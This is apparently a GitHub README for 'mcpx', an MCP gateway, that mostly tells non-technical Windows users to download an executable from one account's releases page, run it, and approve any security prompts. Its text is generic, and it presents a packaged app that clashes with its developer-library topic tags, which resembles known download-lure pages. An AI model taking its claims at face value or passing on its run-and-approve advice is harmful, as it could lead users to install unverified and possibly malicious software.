# 🧩 mcpx - Run MCP servers with fewer tools

[![Download mcpx](https://img.shields.io/badge/Download%20mcpx-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/afiabatool067-png/mcpx/releases)

## 🚀 What is mcpx?

mcpx is a self-hosted MCP gateway for Windows. It helps you connect to more than one MCP server through a small set of tools. It also runs code in a V8 isolate, so each task stays separated from the rest.

Use mcpx if you want one place to manage several MCP servers without setting up each one by hand.

## 💻 What you need

Before you install mcpx, make sure your PC has:

- Windows 10 or Windows 11
- An internet connection for the first download
- Enough free disk space for the app and its files
- Permission to run downloaded apps on your PC

You do not need to know how to code to use the app.

## 📥 Download mcpx

Visit this page to download the Windows release:

https://github.com/afiabatool067-png/mcpx/releases

On that page, look for the latest release and download the Windows file that matches your system. If you see more than one file, choose the one meant for Windows.

## 🪟 Install on Windows

Follow these steps:

1. Open the download page.
2. Find the latest release.
3. Download the Windows version of mcpx.
4. Open your Downloads folder.
5. Double-click the file you downloaded.
6. If Windows asks for approval, choose the option to run it.
7. Wait for the setup or app window to finish loading.

If the file comes in a ZIP folder:

1. Right-click the ZIP file.
2. Choose Extract All.
3. Open the extracted folder.
4. Double-click the mcpx app file.

If Windows shows a security prompt, check the file name and source, then continue if it matches the GitHub release page.

## 🛠️ First-time setup

After you open mcpx for the first time, you may need to:

- Choose where to store your local settings
- Add the MCP servers you want to use
- Set names for each server so they are easy to tell apart
- Turn on the tools you want to share through the gateway

Keep the setup simple at first. Add one server, test it, then add more.

## 🔌 How mcpx works

mcpx sits between your app and your MCP servers.

Instead of connecting to many servers one by one, you can use mcpx as the middle layer. It groups tools from several servers and exposes them through a smaller set of tools. This keeps your setup easier to manage.

It also uses V8 isolate execution for code tasks. That means one task runs in its own space, which helps keep things separate.

## ✅ Common uses

mcpx can help you:

- Connect to more than one MCP server from one place
- Keep your tool list smaller and easier to browse
- Run code tasks in a separate execution space
- Keep a self-hosted setup on your own PC
- Manage local MCP workflows with less setup work

## 🧭 Basic use steps

After installation:

1. Start mcpx.
2. Open your connected MCP client or app.
3. Point it to the mcpx gateway.
4. Add the servers you want to use.
5. Check that the tools appear in the client.
6. Run a simple test request.
7. If it works, add the rest of your servers.

If one server does not respond, remove it and add it again. Check the server name and local path if you changed either one.

## 🗂️ Suggested folder setup

A simple folder layout can make setup easier:

- `mcpx` for the app files
- `servers` for MCP server files
- `data` for local settings
- `logs` for error messages and activity records

Keep folders in one place so you can find them later.

## 🧰 Tips for smooth use

- Start with one MCP server first
- Use clear names for each server
- Keep your files in a folder that is easy to find
- Restart the app after changing server settings
- Use the latest Windows release from GitHub
- Keep a copy of your settings if you plan to move the app to another PC

## 🧪 If something does not work

Try these simple checks:

- Make sure you downloaded the Windows file
- Confirm the file finished downloading
- Open the app again after closing it
- Check that the server path is correct
- Remove and add the server again
- Restart your PC if the app does not start

If the app opens but no tools appear, check that the MCP server is running before you connect it to mcpx.

## 🔒 Local control

mcpx is built for self-hosted use. That means you run it on your own machine. You stay in control of the app files, local settings, and connected servers.

This setup works well if you want a private gateway for MCP tools on Windows.

## 📌 What the project is for

mcpx is useful when you want to:

- Combine several MCP servers
- Keep tool access in one place
- Run a local gateway on Windows
- Use a smaller set of tools instead of many separate ones
- Keep code execution separated through V8 isolate execution

## 🧩 Topic areas

This project fits these topics:

- bun
- claude
- mcp
- mcp-gateway
- mcp-server
- model-context-protocol
- sandbox
- self-hosted
- tool-aggregation
- typescript

## 📎 Download again

If you need to get the app later, use the release page:

https://github.com/afiabatool067-png/mcpx/releases

Open the latest release and download the Windows file again if needed